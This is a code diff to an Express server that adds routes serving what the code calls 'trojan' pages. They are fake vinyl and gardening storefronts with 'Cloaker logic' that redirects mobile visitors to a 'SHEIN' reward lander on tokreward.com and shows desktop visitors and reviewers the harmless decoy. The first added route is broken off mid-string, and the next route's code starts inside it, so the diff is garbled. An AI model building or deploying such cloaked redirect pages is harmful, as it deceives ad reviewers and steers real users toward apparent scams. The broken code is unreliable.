@@ -17,6 +17,223 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/9057/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Vintage Vinyl</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Courier New', monospace;
+                    background-color: #f4e1d2;
+                    color: #5d4037;
+                }
+                .container {
+                    max-width: 1000px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #795548;
+                    color: #f4e1d2;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .record-collection {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                }
+                .record {
+                    background-color: #d7ccc8;
+                    border-radius: 50%;
+                    width: 200px;
+                    height: 200px;
+                    margin: 20px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    text-align: center;
+                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+                    transition: transform 0.3s ease;
+                }
+                .record:hover {
+                    transform: rotate(15deg);
+                }
+                footer {
+                    background-color: #795548;
+                    color: #f4e1d2;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #ffcc80;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Vintage Vinyl</h1>
+                <p>Rediscover the warmth of analog sound</p>
+            </header>
+            <div class="container">
+                <h2>Our Collection</h2>
+                <p>Step into the world of ${slug} Vintage Vinyl, where every record tells a story. Browse our carefully curated selection of classic albums and hidden gems.</p>
+                <div class="record-collection">
+                    <div class="record">
+                        <p>The Beatles<br>"Abbey Road"</p>
+                    </div>
+                    <div class="record">
+                        <p>Pink Floyd<br>"Dark Side of the Moon"</p>
+                    </div>
+                    <div class="record">
+                        <p>Fleetwood Mac<br>"Rumours"</p>
+                    </div>
+                    <div class="record">
+                        <p>Miles Davis<br>"Kind of Blue"</p>
+                    </div>
+                    <div class="record">
+                        <p>David Bowie<br>"The Rise and Fall of Ziggy Stardust"</p>
+                    </div>
+                    <div class="record">
+                        <p>Joni Mitchell<br>"Blue"</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Vintage Vinyl | <a href="https://tokreward.com/pp.html">Privacy
+
+// SHEIN BH FLUENT
+app.get('/9056/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Gardening Paradise</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Arial', sans-serif;
+                    background-color: #e8f5e9;
+                    color: #2e7d32;
+                }
+                .wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #4caf50;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-bottom: 20px;
+                }
+                .plant-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 20px;
+                }
+                .plant-card {
+                    background-color: white;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                    padding: 20px;
+                    text-align: center;
+                }
+                .plant-card img {
+                    max-width: 100%;
+                    border-radius: 5px;
+                }
+                footer {
+                    background-color: #2e7d32;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 20px;
+                }
+                footer a {
+                    color: #8bc34a;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Gardening Paradise</h1>
+            </header>
+            <div class="wrapper">
+                <h2>Welcome to Our Green Oasis</h2>
+                <p>Discover the beauty of nature with ${slug} Gardening Paradise. We offer a wide variety of plants to bring life to your home and garden.</p>
+                <div class="plant-grid">
+                    <div class="plant-card">
+                        <img src="https://example.com/succulent.jpg" alt="Succulent">
+                        <h3>Succulents</h3>
+                        <p>Low-maintenance plants perfect for any space.</p>
+                    </div>
+                    <div class="plant-card">
+                        <img src="https://example.com/fern.jpg" alt="Fern">
+                        <h3>Ferns</h3>
+                        <p>Lush green foliage to freshen up your home.</p>
+                    </div>
+                    <div class="plant-card">
+                        <img src="https://example.com/orchid.jpg" alt="Orchid">
+                        <h3>Orchids</h3>
+                        <p>Elegant blooms to add a touch of sophistication.</p>
+                    </div>
+                    <div class="plant-card">
+                        <img src="https://example.com/herb.jpg" alt="Herbs">
+                        <h3>Herb Garden</h3>
+                        <p>Grow your own fresh herbs for cooking.</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Gardening Paradise | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/94713/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=947`;
